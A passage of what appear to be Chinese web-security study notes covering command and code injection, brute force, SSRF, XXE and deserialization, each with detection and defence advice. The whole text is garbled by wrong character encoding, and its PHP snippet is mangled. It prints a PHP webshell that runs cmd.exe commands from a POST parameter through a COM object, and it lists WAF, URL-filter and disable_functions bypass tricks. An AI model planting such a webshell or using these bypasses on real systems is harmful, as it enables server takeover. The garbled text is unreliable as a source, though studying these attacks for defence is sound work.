å¯†ï¼ševal, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13 æ–‡ä»¶åŒ…å«ä¸Žç”Ÿæˆï¼šrequireï¼Œrequire_onceï¼Œinclude, include_onceï¼Œfile_get_contents, file_put_contents, fputs, fwrite.htaccessï¼šSetHandler, auto_prepend_file, auto_append_file äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•1ã€é»‘ç™½åå•æµ‹è¯•ç»•è¿‡ 2ã€å¯ç”¨ç¬¦å·æ›¿æ¢ 3ã€æ¢è¡Œç¬¦\n 4ã€$IFSæ›¿æ¢ç©ºæ ¼ ä¸‰ã€ç»•è¿‡disable_functionsçš„æ–¹æ³•ç¦æ­¢ webshell æ‰§è¡Œå‘½ä»¤åŽŸç†ï¼šPHPé…ç½®æ–‡ä»¶é‡Œçš„disable_functions = é…ç½®ï¼Œç”¨æ¥ç¦æ­¢æŸäº› php å‡½æ•°ã€‚ 1ã€ é»‘åå•ç»•è¿‡ 2ã€ ç³»ç»Ÿç»„ä»¶ç»•è¿‡ï¼ˆWindowsï¼‰ï¼š 12345678&lt;?phpcommand=_POST[a];wsh = new COM('WScript.shell'); // ç”Ÿæˆä¸€ä¸ª COM å¯¹è±¡exec = wsh-&gt;exec('cmd.exe /c '.command); //è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤stdout = exec-&gt;StdOut();stroutput = stdout-&gt;ReadAll();echo $stroutput?&gt; Shell.Application ä¹Ÿå¯ä»¥å®žçŽ°åŒæ ·çš„æ•ˆæžœã€‚ å½»åº•çš„è§£å†³æ–¹æ¡ˆæ˜¯ç›´æŽ¥åˆ é™¤ System32 ç›®å½•ä¸‹ wshom.ocx æ–‡ä»¶ã€‚ 3ã€ æ‰©å±•åº“ç»•è¿‡ï¼šLinuxä¸‹å¯é€šè¿‡ç¼–è¯‘æ‹“å±•åº“è¿›è¡Œç»•è¿‡ã€‚ é˜²å¾¡æ–¹æ³•ï¼šå°†dlå‡½æ•°åŠ å…¥disable_functionä¸­ç¦ç”¨ã€‚ ä½¿ç”¨PHPçªç ´Disable_functionsæ‰§è¡ŒLinuxå‘½ä»¤ï¼šlinux çš„ webshell ç®¡ç†å‘˜ç¦ç”¨äº†execï¼Œsystemï¼Œpassthruï¼Œpopenï¼Œshell_execç­‰ç­‰ PHP æ‰§è¡Œå‘½ä»¤å‡½æ•°ï¼Œå¯¼è‡´ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œphp æä¾›äº†ä¸€ä¸ªæ‰©å±•æ¨¡å—åŠŸèƒ½ï¼Œä½¿ç”¨ dl å‡½æ•°èƒ½åŒ…å«ä¸€ä¸ªæ‰©å±•æ¨¡å—ã€‚ç±»ä¼¼.soæˆ–è€…æƒ³windowsä¸‹çš„ dll æ–‡ä»¶ã€‚å¯ä»¥è‡ªå®šä¹‰å‡½æ•°æ¥è°ƒç”¨ linux å‘½ä»¤è€Œæ— è§†Disable_functionsçš„é™åˆ¶ã€‚ åœ¨PHPä¸­ä½¿ç”¨create_function()åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¦‚æžœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æž„é€ ç‰¹æ®Šå­—ç¬¦ä¸²ä¼ é€’ç»™ create_function()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å››ã€æ£€æµ‹æ–¹æ³•åŸºäºŽé»‘ç›’çš„æµ‹è¯•ï¼šç®€å•ç‚¹å°±æ˜¯ç›´æŽ¥æ‰‹å·¥åœ¨è¾“å…¥å†…å®¹ä¹‹åŽæ·»åŠ å„ç§åˆ†å·æˆ–å…¶å®ƒå¯ä»¥ç»•è¿‡çš„ç¬¦å·å†æ·»åŠ å‘½ä»¤ï¼Œæœ€åŽæŸ¥çœ‹è¿”å›žç»“æžœåˆ¤æ–­ã€‚ åŸºäºŽç™½ç›’çš„æµ‹è¯•ï¼šæŸ¥çœ‹æºä»£ç ï¼Œæœç´¢PHPä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°å¦‚systemã€passthruç­‰ã€‚ äº”ã€é˜²å¾¡æ–¹æ³•1ã€å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚ 2ã€ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–å‡½æ•°åº“å®žçŽ°å¤–éƒ¨åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åŠŸèƒ½ã€‚ 3ã€åœ¨æ‰§è¡Œ system ç­‰å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½çš„å‡½æ•°å‰ï¼Œç¡®å®šå‚æ•°å†…å®¹ã€‚ 4ã€ä½¿ç”¨ escapeshellarg ()å‡½æ•°å’Œescapeshellcmd()å‡½æ•°å¤„ç†ç›¸å…³ç”¨æˆ·è¾“å…¥çš„å†…å®¹ã€‚escapeshellarg() å‡½æ•°ä¼šå°†ä»»ä½•å¼•èµ·å‚æ•°æˆ–å‘½ä»¤ç»“æŸçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚å•å¼•å·â€œâ€™â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€™â€ï¼ŒåŒå¼•å·â€œâ€â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€â€ï¼Œåˆ†å·â€œ ;â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\;â€ï¼Œè¿™æ · escapeshellarg ä¼šå°†å‚æ•°å†…å®¹é™åˆ¶åœ¨ä¸€å¯¹å•å¼•å·æˆ–åŒå¼•å·é‡Œé¢ï¼Œè½¬ä¹‰å‚æ•°ä¸­æ‰€åŒ…å«çš„å•å¼•å·æˆ–åŒå¼•å·ï¼Œä½¿å…¶æ— æ³•å¯¹å½“å‰æ‰§è¡Œè¿›è¡Œæˆªæ–­ï¼Œå®žçŽ°é˜²èŒƒå‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚escapeshellcmd()å‡½æ•°ä¼šè½¬ä¹‰å†…å®¹ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥è¿›è¡Œé˜²å¾¡ï¼Œè¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š# $ ; , \ â€˜ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5ã€ä½¿ç”¨ safe_mode_exec_dir æ‰§è¡Œå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚å°† php.ini æ–‡ä»¶ä¸­çš„ safe_mode è®¾ç½®ä¸º Onï¼Œç„¶åŽå°†å…è®¸æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­ï¼Œå¹¶ä½¿ç”¨ safe_mode_exec_dir æŒ‡å®šè¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚è¿™æ ·ï¼Œåœ¨éœ€è¦æ‰§è¡Œç›¸åº”çš„å¤–éƒ¨ç¨‹åºæ—¶ï¼Œç¨‹åºå¿…é¡»åœ¨ safe_mode_exec_diræŒ‡å®šçš„ç›®å½•ä¸­æ‰ä¼šå…è®¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œå°†å¤±è´¥ã€‚ æš´åŠ›ç ´è§£ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ æš´åŠ›ç ´è§£å…¶å®žå¹¶ä¸ç®—æ˜¯æ¼æ´žè€Œæ˜¯è®¾è®¡ç¼ºé™·ï¼Œå½“é¡µé¢æˆ–ç¨‹åºæœªå¯¹è¯·æ±‚çš„æ•°é‡è¿›è¡Œä¸¥æ ¼çš„é™åˆ¶æ—¶ï¼Œæ”»å‡»è€…å¯ä½¿ç”¨å­—å…¸ä¸€ç›´æš´åŠ›ç ´è§£ç”¨æˆ·åå¯†ç ï¼Œå¯¼è‡´å¯†ç è¢«ç ´è§£å‡ºæ¥çš„å®‰å…¨é£Žé™©ã€‚ åˆ†ç±» 1ã€C/Sæž¶æž„æš´åŠ›ç ´è§£ï¼š ä¸»è¦ä½¿ç”¨çš„ç ´è§£å·¥å…·Hydraã€Bruterã€X-scan 2ã€B/Sæž¶æž„æš´åŠ›ç ´è§£ï¼š ä½¿ç”¨Burpsuiteé•œåƒè¡¨å•çˆ†ç ´ äºŒã€æ£€æµ‹æ–¹æ³•ç®€å•ç²—æš´çš„æ–¹æ³•ï¼Œç›´æŽ¥ä½¿ç”¨Burpsuiteè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆé˜²æš´ç ´çš„æœºåˆ¶å³å¯ã€‚ ä¸‰ã€é˜²å¾¡æ–¹æ³•1ã€è®¾ç½®å¤æ‚çš„å¯†ç  2ã€é‡‡ç”¨éªŒè¯ç æœºåˆ¶ï¼ŒåŒæ—¶å¯é˜²èŒƒCSRFæ”»å‡» 3ã€ç™»é™†æ—¥å¿—ï¼Œé™åˆ¶ç™»å½•æ¬¡æ•° 4ã€è°ƒç”¨sleep()å‡½æ•°ï¼Œå½“ç™»å½•å¤±è´¥æ—¶åœæ­¢ä¸€æ®µæ—¶é—´æ‰å…è®¸å†æ¬¡ç™»å½•ï¼Œå¦‚DVWAçš„Highçº§çš„é˜²æš´ç ´æœºåˆ¶ ä»£ç æ³¨å…¥ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ ä»£ç æ³¨å…¥ï¼Œä¸Žå‘½ä»¤æ³¨å…¥ç±»ä¼¼ï¼Œç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥å†…å®¹è¿›è¡Œä¸¥æ ¼æ ¡éªŒä»Žè€Œå¯¼è‡´æ¶æ„ä»£ç æ³¨å…¥æ‰§è¡Œï¼Œåªä¸è¿‡æ˜¯æ³¨å…¥åˆ°ç‰¹å®šçš„ç¼–ç¨‹è¯­è¨€ä»£ç ä¸­ï¼Œå¦‚PHPçš„evalæ³¨å…¥ã€HTMLé¡µé¢çš„JSæ³¨å…¥ã€OGNLæ³¨å…¥ç­‰ã€‚ è¿™é‡Œä»¥PHPä¸ºä¸»ï¼ŒJavaä»£ç ä¼šåœ¨Javaåˆ†ç±»ä¸­å•ç‹¬æ€»ç»“ã€‚ æˆå›  ç¨‹åºæœªä¸¥æ ¼åŒºåˆ†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¯æ•°æ®è¿˜æ˜¯ä»£ç ã€‚ PHPä¸­ä»£ç æ³¨å…¥å‡½æ•° eval()ã€assert()ã€preg_replace()ã€str_replace()ã€call_user_func()â€¦ç­‰å‡½æ•°ã€‚ eval()å‡½æ•°æ³¨å…¥æ”»å‡»ï¼Œå°†å‚æ•°å­—ç¬¦ä¸²ä½œä¸ºPHP ç¨‹åºä»£ç æ¥æ‰§è¡Œï¼Œç”¨æˆ·å¯ä»¥å°† PHP ä»£ç ä¿å­˜æˆå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œç„¶åŽä¼ é€’ç»™ eval å‡½æ•°æ‰§è¡Œã€‚ PHPä¸­çš„assert()ã€preg_replace()ã€str_replace()ä»¥åŠcall_user_func()å‡½æ•°åŒæ ·å¯ä»¥å®žçŽ°eval æ³¨å…¥æ”»å‡»çš„æ•ˆæžœã€‚preg_replace()å‡½æ•°çš„ä½œç”¨æ˜¯ç”¨æ¥æ‰§è¡Œå¸¸è§„è¡¨è¾¾å¼çš„æŸ¥æ‰¾å’Œæ›¿æ¢çš„ï¼Œå½“æ›¿æ¢å†…å®¹ä¸ºç”¨æˆ·å¯æŽ§æ•°æ®æ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥æ”»å‡»æ¼æ´žçš„å½¢æˆã€‚ äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•å’Œå‘½ä»¤æ³¨å…¥ç±»ä¼¼ã€‚ ä¸‰ã€æ£€æµ‹æ–¹æ³•åŸºäºŽé»‘ç›’çš„æµ‹è¯•ï¼šç®€å•ç‚¹å°±æ˜¯ç›´æŽ¥æ‰‹å·¥åœ¨è¾“å…¥å†…å®¹ä¹‹åŽæ·»åŠ å„ç§åˆ†å·æˆ–å…¶å®ƒå¯ä»¥ç»•è¿‡çš„ç¬¦å·å†æ·»åŠ å‘½ä»¤ï¼Œæœ€åŽæŸ¥çœ‹è¿”å›žç»“æžœåˆ¤æ–­ã€‚ åŸºäºŽç™½ç›’çš„æµ‹è¯•ï¼šæŸ¥çœ‹æºä»£ç ï¼Œæœç´¢ä¸Žæ‰§è¡ŒPHPä»£ç çš„å‡½æ•°å¦‚evalã€assertç­‰ã€‚ å››ã€é˜²å¾¡æ–¹æ³•1ã€å°½é‡ä¸è¦æ‰§è¡Œå¤–éƒ¨çš„åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤ã€‚ 2ã€ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–å‡½æ•°åº“å®žçŽ°å¤–éƒ¨åº”ç”¨ç¨‹åºæˆ–å‘½ä»¤çš„åŠŸèƒ½ã€‚ 3ã€åœ¨æ‰§è¡Œphpä¸­eval()ç­‰ä»£ç æ‰§è¡ŒåŠŸèƒ½çš„å‡½æ•°å‰ï¼Œç¡®å®šå‚æ•°å†…å®¹ã€‚ 4ã€ä½¿ç”¨ escapeshellarg ()å‡½æ•°å’Œescapeshellcmd()å‡½æ•°å¤„ç†ç›¸å…³ç”¨æˆ·è¾“å…¥çš„å†…å®¹ã€‚escapeshellarg() å‡½æ•°ä¼šå°†ä»»ä½•å¼•èµ·å‚æ•°æˆ–å‘½ä»¤ç»“æŸçš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚å•å¼•å·â€œâ€™â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€™â€ï¼ŒåŒå¼•å·â€œâ€â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\â€â€ï¼Œåˆ†å·â€œ ;â€ä¼šè¢«è½¬ä¹‰ä¸ºâ€œ\;â€ï¼Œè¿™æ · escapeshellarg ä¼šå°†å‚æ•°å†…å®¹é™åˆ¶åœ¨ä¸€å¯¹å•å¼•å·æˆ–åŒå¼•å·é‡Œé¢ï¼Œè½¬ä¹‰å‚æ•°ä¸­æ‰€åŒ…å«çš„å•å¼•å·æˆ–åŒå¼•å·ï¼Œä½¿å…¶æ— æ³•å¯¹å½“å‰æ‰§è¡Œè¿›è¡Œæˆªæ–­ï¼Œå®žçŽ°é˜²èŒƒå‘½ä»¤æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚escapeshellcmd()å‡½æ•°ä¼šè½¬ä¹‰å†…å®¹ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥è¿›è¡Œé˜²å¾¡ï¼Œè¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š# $ ; , \ â€˜ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5ã€ä½¿ç”¨ safe_mode_exec_dir æ‰§è¡Œå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚å°† php.ini æ–‡ä»¶ä¸­çš„ safe_mode è®¾ç½®ä¸º Onï¼Œç„¶åŽå°†å…è®¸æ‰§è¡Œçš„æ–‡ä»¶æ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­ï¼Œå¹¶ä½¿ç”¨ safe_mode_exec_dir æŒ‡å®šè¿™ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„ã€‚è¿™æ ·ï¼Œåœ¨éœ€è¦æ‰§è¡Œç›¸åº”çš„å¤–éƒ¨ç¨‹åºæ—¶ï¼Œç¨‹åºå¿…é¡»åœ¨ safe_mode_exec_diræŒ‡å®šçš„ç›®å½•ä¸­æ‰ä¼šå…è®¸æ‰§è¡Œï¼Œå¦åˆ™æ‰§è¡Œå°†å¤±è´¥ã€‚ SSRFä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æž„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´žã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»Žå¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸Žå®ƒç›¸è¿žè€Œä¸Žå¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚ å½¢æˆçš„åŽŸå› å¤§éƒ½æ˜¯ç”±äºŽæœåŠ¡ç«¯æä¾›äº†ä»Žå…¶ä»–æœåŠ¡å™¨åº”ç”¨èŽ·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸Žé™åˆ¶ã€‚SSRFæ¼æ´žå°±æ˜¯é€šè¿‡ç¯¡æ”¹èŽ·å–èµ„æºçš„è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨ï¼Œä½†æ˜¯æœåŠ¡å™¨å¹¶æ²¡æœ‰å‘çŽ°åœ¨è¿™ä¸ªè¯·æ±‚æ˜¯åˆæ³•çš„ï¼Œç„¶åŽæœåŠ¡å™¨ä»¥ä»–çš„èº«ä»½æ¥è®¿é—®å…¶ä»–æœåŠ¡å™¨çš„èµ„æºã€‚ å‡ºçŽ°æ¼æ´žçš„å¸¸è§ä½ç½® 1ï¼‰åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ 2ï¼‰è½¬ç æœåŠ¡ 3ï¼‰åœ¨çº¿ç¿»è¯‘ 4ï¼‰å›¾ç‰‡åŠ è½½ä¸Žä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ 5ï¼‰å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½ 6ï¼‰æœªå…¬å¼€çš„apiå®žçŽ°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½ 7ï¼‰ä»ŽURLå…³é”®å­—ä¸­å¯»æ‰¾ äºŒã€ç»•è¿‡WAFçš„æ–¹æ³•ä¸»è¦é’ˆå¯¹URLè¿‡æ»¤çš„ç»•è¿‡ã€‚ 1ã€ ä½¿ç”¨@ç¬¦å·ï¼šæˆ‘ä»¬è¯·æ±‚http://a.com@b.comä¸Žè¯·æ±‚http://b.comçš„ç»“æžœæ˜¯ä¸€è‡´çš„ï¼› 2ã€ IPåœ°å€è½¬æ¢è¿›åˆ¶è®¿é—®ï¼šå¦‚115.239.210.26 ï¼ 16373751032 3ã€ æ·»åŠ ç«¯å£å·ï¼šhttp://127.0.0.1:8080 4ã€ ä½¿ç”¨çŸ­é“¾æŽ¥ï¼šhttp://dwz.cn/11SMa ä¸‰ã€æ£€æµ‹æ–¹æ³•1ã€å› ä¸ºSSRFæ¼æ´žæ˜¯æž„é€ æœåŠ¡å™¨å‘é€è¯·æ±‚çš„å®‰å…¨æ¼æ´žï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æžå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´ž 2ã€åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ ï¼Œå¦‚æžœè¯¥èµ„æºåœ°å€ç±»åž‹ä¸º http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´ž å››ã€é˜²å¾¡æ–¹æ³•1ã€è¿‡æ»¤è¿”å›žä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æžœwebåº”ç”¨æ˜¯åŽ»èŽ·å–æŸä¸€ç§ç±»åž‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›žç»“æžœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›žçš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚ 2ã€ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚ 3ã€é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ï¼Œ80,443,8080,8090ã€‚ 4ã€é»‘åå•å†…ç½‘ipã€‚é¿å…åº”ç”¨è¢«ç”¨æ¥èŽ·å–èŽ·å–å†…ç½‘æ•°æ®ï¼Œæ”»å‡»å†…ç½‘ã€‚ 5ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºŽfile:///,gopher://,ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ã€‚ XMLæ³¨å…¥ä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ XMLæ˜¯ä¸€ç§å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç†è§£ä¸ºHTMLçš„æ‰©å±•è¯­è¨€ï¼Œä¸€èˆ¬ç”¨äºŽæ•°æ®å­˜å‚¨ã€æ•°æ®ä¼ è¾“ã€æ•°æ®å…±äº«ï¼Œå…¶ä¸­DTDæ–‡æ¡£æ¥è§£é‡ŠXMLæ–‡æ¡£ã€‚XMLå¿…é¡»åŒ…å«æ ¹å…ƒç´ ï¼Œæ‰€æœ‰çš„æ ‡ç­¾éƒ½è¦é—­åˆï¼Œå¯¹å¤§å°å†™æ•æ„Ÿï¼Œå¹¶ä¸”å±žæ€§å€¼éœ€è¦åŠ å¼•å·ã€‚ XMLæ³¨å…¥å³XXEï¼ˆXMLå¤–éƒ¨å®žä½“æ³¨å…¥ï¼‰ï¼Œæ˜¯æŒ‡åˆ©ç”¨å¯æŽ§çš„å‚æ•°æˆ–å…¥å£æ¥åŠ è½½ä¸å¯æŽ§çš„å‚æ•°æˆ–ä»£ç ï¼Œé€ æˆä¸å¯æŽ§çš„è¿è¡Œç»“æžœã€‚ ENTITYå®žä½“ï¼šå¦‚æžœåœ¨XMLæ–‡æ¡£ä¸­éœ€è¦é¢‘ç¹ä½¿ç”¨æŸä¸€æ¡æ•°æ®ï¼Œå¯ä»¥é¢„å…ˆç»™è¿™ä¸ªæ•°æ®èµ·ä¸€ä¸ªåˆ«åã€‚å³ä¸€ä¸ªENTITYï¼Œç„¶åŽå†åœ¨æ–‡æ¡£ä¸­è°ƒç”¨å®ƒã€‚ XMLå®šä¹‰äº†ä¸¤ç§ç±»åž‹çš„ENTITYï¼Œä¸€ç§åœ¨XMLæ–‡æ¡£ä¸­ä½¿ç”¨ï¼Œå¦ä¸€ç§åœ¨ä¸ºå‚æ•°åœ¨DTDæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ å®šä¹‰è¯­æ³•ï¼š\&lt;!DOCTYPE æ–‡ä»¶å [ \&lt;!ENTITY å®žä½“å â€œå®žä½“å†…å®¹â€&gt; ] &gt; å®šä¹‰å¥½çš„ENTITYåœ¨æ–‡æ¡£ä¸­é€šè¿‡â€œ&amp;å®žä½“å;â€æ¥ä½¿ç”¨ã€‚ æ­£å¸¸æ¥è¯´ï¼ŒDTDåˆ†ä¸ºå†…éƒ¨DTDä¸Žå¤–éƒ¨DTDï¼Œå†…éƒ¨DTDåŒ…å«åœ¨XMLæ–‡æ¡£ä¸­,å¤–éƒ¨DTDåˆ™é€šè¿‡URLå¼•ç”¨ã€‚ä¸€ä¸ªDTDæ–‡ä»¶æ˜¯ä»¥.dtdç»“å°¾çš„æ–‡æœ¬æ–‡ä»¶ ã€‚å‰é¢è¿˜è¦åŠ ä¸ŠSYSTEMï¼Œä½†æ˜¯å¦‚æžœæ­¤å¤„æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å¼•ç”¨ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶çš„ï¼Œå‰ææ˜¯é¡µé¢æœ‰å›žæ˜¾ï¼Œå¦åˆ™ä½ åªå¼•ç”¨äº†æ–‡ä»¶ä½†ä¸çŸ¥é“æ–‡ä»¶å†…å®¹ã€‚ æˆå› ï¼š Xfireä½¿ç”¨äº†STAXè§£æžXMLå¯¼è‡´XMLå®žä½“æ³¨å…¥å‘ç”Ÿã€‚ 1ã€ç›´æŽ¥å¼•å…¥XMLå¤–éƒ¨å®žä½“ 2ã€æœªåŠ ä»»ä½•è¿‡æ»¤ç›´æŽ¥parse æ¼æ´žå±å®³ï¼š 1ã€ä»»æ„æ–‡ä»¶è¯»å–ï¼šé€šè¿‡å¤–éƒ¨å®žä½“å¼•ç”¨ï¼Œå¯ä»¥èŽ·å–æ–‡ä»¶å†…å®¹ 2ã€URLè¯·æ±‚ï¼ŒSSRF 3ã€DoS 4ã€è¿œç¨‹ä»£ç æ‰§è¡Œï¼šåœ¨PHPå¼€å¯expectæ‰©å±•çš„å‰æä¸‹ äºŒã€æ£€æµ‹æ–¹æ³•ç›²æµ‹ï¼šåˆ¤æ–­requestçš„XMLè¯·æ±‚æ˜¯å¦è¢«è§£æžï¼Œå¯ä»¥æ ¹æ®è¯·æ±‚å¤´ä¸­çš„â€œSOAPâ€å­—æ®µæ¥åˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥æ ¹æ®é”™è¯¯è¿”å›žä¸­æœ‰â€œSAXâ€å­—æ ·ã€‚ æ¼æ´žæŒ–æŽ˜æ€»ç»“ï¼šä¸€èˆ¬ä¸ºXfireå¼€å‘çš„æˆ–è€…æŸäº›wsdlç»“å°¾çš„æ–‡ä»¶ã€‚ 1ã€Serviceä¸ºXfire 2ã€æ˜Žæ˜¾çš„XMLä½œä¸ºå†…å®¹çš„è¾“å…¥ç‚¹ 3ã€æŸäº›ä»¥JSONæ ¼å¼çš„Request ä¸‰ã€é˜²å¾¡æ–¹æ³•1ã€ç¦ç”¨å¤–éƒ¨å®žä½“ 2ã€è¿‡æ»¤å’ŒéªŒè¯ç”¨æˆ·æäº¤çš„XMLæ•°æ® 3ã€ä¸å…è®¸XMLä¸­å«æœ‰ä»»ä½•è‡ªå·±å£°æ˜Žçš„DTD 4ã€æœ‰æ•ˆçš„æŽªæ–½ï¼šé…ç½®XML parseråªèƒ½ä½¿ç”¨é™æ€DTDï¼Œç¦æ­¢å¤–æ¥å¼•å…¥ï¼›å¯¹äºŽJavaæ¥è¯´ï¼Œç›´æŽ¥è®¾ç½®ç›¸åº”çš„å±žæ€§å€¼ä¸ºfalseå³å¯ ååºåˆ—åŒ–æ¼æ´žä¸€ã€åŸºæœ¬æ¦‚å¿µæ¼æ´žå®šä¹‰ é€šå¸¸æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œå…¶ä¸­ä¿å­˜äº†ä¸€äº›å±žæ€§å€¼ï¼Œä¸ºäº†æ–¹ä¾¿ä¸‹æ¬¡å¯ä»¥ç»§ç»­ä½¿ç”¨åœ¨è¿™ä¸ªå¯¹è±¡æˆ–è€…åœ¨å…¶ä»–çš„æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨è¯¥å¯¹è±¡ï¼ŒäºŽæ˜¯å°±å¯ä»¥è°ƒç”¨serialize()å‡½æ•°å°†è¯¥å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œå°†è¯¥å­—ç¬¦ä¸²ä¿å­˜èµ·æ¥ï¼Œç­‰åˆ°éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡æ—¶åªéœ€å°†è¯¥å­—ç¬¦ä¸²ä¼ è¿‡åŽ»å¹¶è°ƒç”¨unserialize()å‡½æ•°å¯¹å…¶ååºåˆ—åŒ–å³å¯ã€‚ è¿™é‡Œä»¥PHPä¸ºä¾‹ï¼ŒJavaçš„ä¼šåœ¨Javaåˆ†ç±»å•ç‹¬æ€»ç»“ã€‚ PHPåœ¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œè‹¥å­˜åœ¨ç›¸åº”çš„é­”æ³•å‡½æ•°ã€unserialize()å‡½æ•°çš„å‚æ•°å¯æŽ§ä¸”å¯ä»¥ä¼ 